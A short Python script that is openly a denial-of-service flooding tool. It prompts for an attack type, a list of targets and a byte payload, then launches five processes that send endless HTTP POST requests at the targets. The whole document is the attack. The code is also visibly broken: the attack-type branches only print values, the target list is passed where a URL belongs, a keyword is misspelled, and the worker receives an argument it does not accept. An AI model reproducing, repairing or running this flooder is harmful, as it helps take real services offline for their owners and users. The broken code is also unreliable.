import requests as res
import multiprocessing

choices = [1, 2, 3]

attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n"))
vector = input("target(targets):\n").split(" ")
bye = input("number of bytes: \n").encode()


if attack_type == choices[0]:
    print(bye)
    
if attack_type == choices[1]:
    print(vector)

if attack_type == choices[2]:
    print(attack_type)

def http():
    while True:
        for i in vector:
            response = res.post(vector, data=bye, jason=None)
            print(response.text)
            
print("using post method to: ", vector)

processes = []

for i in range(5):
    p = multiprocessing.Process(target=http, args=(i,))
    processes.append(p)
    p.start()

# Wait for all processes to complete
for p in processes:
    p.join()
